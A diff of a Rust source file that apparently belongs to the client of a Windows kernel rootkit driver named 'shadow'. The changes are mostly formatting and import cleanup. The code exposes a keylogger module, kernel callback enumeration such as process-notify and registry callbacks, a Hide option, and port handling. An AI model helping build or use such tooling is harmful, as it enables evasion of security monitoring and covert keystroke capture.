@@ -1,26 +1,19 @@
-use {
-    log::*,
-    colored::Colorize,
-    env_logger::Builder,
-    sysinfo::System,
-    std::{path::Path, ptr::null_mut, io::Write},
-    windows_sys::{
-        w,
-        Win32::{
-            Foundation::{
-                GetLastError, GENERIC_READ, GENERIC_WRITE, 
-                HANDLE, INVALID_HANDLE_VALUE
-            },
-            Storage::FileSystem::{
-                CreateFileW, FILE_ATTRIBUTE_NORMAL,
-                OPEN_EXISTING,
-            },
-        },
-    },   
+use colored::Colorize;
+use env_logger::Builder;
+use log::{Level, LevelFilter};
+
+use std::{io::Write, path::Path, ptr::null_mut};
+use sysinfo::System;
+use windows_sys::{
+    w,
+    Win32::{
+        Foundation::{GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE},
+        Storage::FileSystem::{CreateFileW, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING},
+    },
 };
 
+mod keylogger;
 pub mod macros;
-pub mod keylogger;
 pub use keylogger::*;
 
 pub const BANNER: &str = r#"
@@ -35,11 +28,11 @@ pub const BANNER: &str = r#"
 ///
 /// # Arguments
 ///
-/// - `file` - A string reference representing the file path.
+/// * `file` - A string reference representing the file path.
 ///
 /// # Returns
 ///
-/// - `true` if the file exists, `false` otherwise.
+/// * `true` if the file exists, `false` otherwise.
 pub fn check_file(file: &String) -> bool {
     let file = Path::new(file);
     file.exists()
@@ -52,8 +45,8 @@ pub fn check_file(file: &String) -> bool {
 /// * `Ok(HANDLE)` - if the driver handle is successfully opened.
 /// * `Err(())` - if there is an error.
 pub fn open_driver() -> Result<HANDLE, &'static str> {
-    info!("Opening driver handle");
-    
+    log::info!("Opening driver handle");
+
     let h_file = unsafe {
         CreateFileW(
             w!("\\\\.\\shadow"),
@@ -67,11 +60,13 @@ pub fn open_driver() -> Result<HANDLE, &'static str> {
     };
 
     if h_file == INVALID_HANDLE_VALUE {
-        error!("CreateFileW failed with error: {}", unsafe { GetLastError() });
+        log::error!("CreateFileW failed with error: {}", unsafe {
+            GetLastError()
+        });
         return Err("Failed to open the driver.");
     }
 
-    info!("Driver handle successfully opened");
+    log::info!("Driver handle successfully opened");
     Ok(h_file)
 }
 
@@ -125,7 +120,7 @@ pub fn validate_sys_extension(val: &str) -> Result<String, String> {
 /// Searches for the process ID (PID) of a running process by name.
 ///
 /// # Arguments
-/// 
+///
 /// * `name` - A reference to a string containing the name of the process to be searched.
 ///
 /// # Returns
@@ -150,19 +145,19 @@ pub fn get_process_by_name(name: &str) -> Option<u32> {
 pub enum Callbacks {
     /// Callback for process creation notifications.
     Process,
-    
+
     /// Callback for thread creation notifications.
     Thread,
-    
+
     /// Callback for image loading notifications.
     LoadImage,
-    
+
     /// Callback for registry changes.
     Registry,
-    
+
     /// Callback for object processing.
     ObProcess,
-    
+
     /// Callback for thread object processing.
     ObThread,
 }
@@ -173,7 +168,6 @@ impl Callbacks {
     /// # Returns
     ///
     /// * A `common::enums::Callbacks` variant corresponding to the selected callback.
-    /// 
     pub fn to_shared(self) -> common::enums::Callbacks {
         match self {
             Callbacks::Process => common::enums::Callbacks::PsSetCreateProcessNotifyRoutine,
@@ -202,7 +196,6 @@ impl Options {
     /// # Returns
     ///
     /// * A `common::enums::Options` variant corresponding to the selected option.
-    /// 
     pub fn to_shared(self) -> common::enums::Options {
         match self {
             Options::Hide => common::enums::Options::Hide,
@@ -217,7 +210,7 @@ impl Options {
 pub enum Protocol {
     /// Transmission Control Protocol (TCP).
     TCP,
-    
+
     /// User Datagram Protocol (UDP).
     UDP,
 }
@@ -228,7 +221,6 @@ impl Protocol {
     /// # Returns
     ///
     /// * A `common::enums::Protocol` variant corresponding to the selected protocol.
-    /// 
     pub fn to_shared(self) -> common::enums::Protocol {
         match self {
             Protocol::TCP => common::enums::Protocol::TCP,
@@ -242,7 +234,7 @@ impl Protocol {
 pub enum PortType {
     /// Local port.
     LOCAL,
-    
+
     /// Remote port.
     REMOTE,
 }
@@ -253,7 +245,6 @@ impl PortType {
     /// # Returns
     ///
     /// * A `common::enums::PortType` variant corresponding to the selected port type.
-    /// 
     pub fn to_shared(self) -> common::enums::PortType {
         match self {
             PortType::LOCAL => common::enums::PortType::LOCAL,
